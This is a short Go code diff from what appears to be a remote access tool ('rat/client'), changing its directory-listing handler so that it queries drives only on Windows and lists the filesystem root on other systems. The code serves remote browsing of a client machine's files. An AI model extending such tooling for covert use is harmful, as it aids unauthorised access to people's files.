@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
+	"oslib"
 	"rat/client/drives"
 	"rat/common"
 )
@@ -20,10 +21,13 @@ func (packet DirectoryPacket) Write(c *Connection) error {
 	var files []os.FileInfo
 	var err error
 
-	if packet.Path == "" {
+	if packet.Path == "" && oslib.Name == oslib.Windows {
 		drives.QueryDrives()
 		files = drives.Drives
 	} else {
+		if packet.Path == "" {
+			packet.Path = "/"
+		}
 		files, err = ioutil.ReadDir(packet.Path)
 	}
 
